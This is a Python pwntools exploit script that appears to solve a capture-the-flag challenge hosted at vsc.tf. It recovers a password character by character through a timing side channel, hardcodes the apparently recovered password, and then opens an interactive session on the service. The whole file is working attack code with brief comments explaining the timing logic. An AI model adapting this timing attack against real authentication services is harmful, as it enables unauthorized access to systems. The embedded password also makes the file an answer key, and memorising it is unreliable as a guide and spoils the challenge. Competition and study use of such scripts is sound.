#!/usr/bin/env python3
from pwn import *
import string
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './shs'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warning'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'vsc.tf', 7004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
PASSWORD = 'wSotq}JQUe'
POOL = string.printable 

def exploit():
    global io
    global PASSWORD

    while len(PASSWORD) < 10:
        print()
        for char in POOL:
            print(f'[{len(PASSWORD)+1}] "{char}"', end='')
            io = initialize()
            io.sendlineafter(b'password:', (PASSWORD+char).encode().ljust(10, b'A'))
            start_time = time.time()

            if len(PASSWORD) < 9:
                io.recvuntil(b'Wr') # Wrong
            else:
                io.recvline()
                line = io.recvline()
                if b'Wrong' not in line:
                    PASSWORD += char
                    print()
                    break
            
            end_time = time.time()

            # expected time taken if the character is incorrect
            # the expected time for each character processed is 0.5
            # so if the first character is incorrect, the expected time is around 0.5
            # else if the first character is correct, the expected time is around 1.0
            # since it will also process the next character
            expected_time = 1 if len(PASSWORD) == 0 else (len(PASSWORD)+1)*0.5+0.6

            print(f" => Time taken: {end_time - start_time:.3f} Expected >= {expected_time:.3f}")

            io.close()
            if end_time - start_time > expected_time:
                PASSWORD += char
                break
        log.warning(f"Current password[{len(PASSWORD)}]: {PASSWORD}")

    io = initialize()
    io.sendlineafter(b'password:', PASSWORD.encode())
    io.interactive()
    
if __name__ == '__main__':
    exploit()